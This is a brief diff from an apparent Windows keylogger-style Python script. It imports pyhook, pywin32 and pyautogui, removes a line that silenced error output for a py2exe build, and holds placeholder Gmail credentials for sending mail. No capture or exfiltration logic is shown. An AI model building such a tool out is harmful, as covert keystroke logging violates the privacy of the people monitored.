@@ -18,8 +18,6 @@ try:
 except ImportError:
     print("required pyhook, pywin32 and pyautogui")
     exit()
-    
-sys.stderr = None  # prevent py2exe from showing error
 
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
